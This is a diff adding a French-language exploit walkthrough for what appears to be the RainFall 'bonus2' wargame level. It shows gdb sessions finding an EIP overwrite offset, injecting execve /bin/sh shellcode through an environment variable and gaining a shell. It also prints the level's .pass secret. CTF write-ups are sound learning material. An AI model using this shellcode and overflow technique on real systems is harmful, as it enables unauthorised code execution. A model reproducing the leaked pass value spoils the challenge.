@@ -292,4 +292,112 @@ Hello Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2AAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab`
     - <+163>...<+164>
       - Return eax (le retour de puts)
       - Réinitialisation de la mémoire, fin d'exécution<br/><br/>
+
 ## Exploit
+
+On peut voir qu'on controle une partie de l'eip a partir du second argument
+
+```
+Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 200') $(python -c 'print "B" * 200')
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08004242 in ?? ()
+(gdb) info registers
+eax            0x4f     79
+ecx            0xffffffff       -1
+edx            0xb7fd28b8       -1208145736
+ebx            0xbffffa50       -1073743280
+esp            0xbffffa00       0xbffffa00
+ebp            0x42424242       0x42424242
+esi            0xbffffa9c       -1073743204
+edi            0xbffffa4c       -1073743284
+eip            0x8004242        0x8004242
+eflags         0x210286 [ PF SF IF RF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+```
+
+Cherchons l'offset: 
+
+Avec aucune variable d'environnement LANG de set
+```
+Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 200') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08006241 in ?? ()
+```
+
+Avec export LANG="nl"
+```
+Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 200') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+
+Program received signal SIGSEGV, Segmentation fault.
+0x38614137 in ?? ()
+```
+
+```shell
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 38614137
+[*] Exact match at offset 23
+```
+
+Verification
+```
+(gdb) r $(python -c 'print "A" * 200') $(python -c 'print "B" * 23 + "CCCC"')                                                             
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 200') $(python -c 'print "B" * 23 + "CCCC"')
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBCCCC
+
+Program received signal SIGSEGV, Segmentation fault.
+0x43434343 in ?? ()
+```
+
+Maintenant nous créons une variable d'environnement avec notre shellcode dedans
+```
+export EXPLOIT=$(python -c 'print "\x90" * 20 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
+```
+
+```
+bonus2@RainFall:~$ echo $EXPLOIT 
+1Ph//shh/binPS
+              
+```
+
+On trouve l'adresse de notre shellcode dans gdb
+```
+(gdb) x/10s *((char **) environ)
+0xbffffdef:      "EXPLOIT=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\231Ph//shh/bin\211\343PS\211\341\260\v\315\200"
+0xbffffe24:      "SHELL=/bin/bash"
+0xbffffe34:      "TERM=tmux-256color"
+0xbffffe47:      "SSH_CLIENT=172.16.239.146 42506 4242"
+0xbffffe6c:      "SSH_TTY=/dev/pts/0"
+0xbffffe7f:      "USER=bonus2"
+0xbffffe8b:      "LS_COLORS="
+0xbffffe96:      "COLUMNS=139"
+0xbffffea2:      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
+0xbffffeef:      "MAIL=/var/mail/bonus2"
+```
+
+```
+Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 200') $(python -c 'print "B" * 23 + "\xfe\xfd\xff\xbf"')
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB
+process 14619 is executing new program: /bin/dash
+$ whoami
+bonus2
+```
+
+
+```
+$ cat .pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+$ whoami
+bonus2
+```
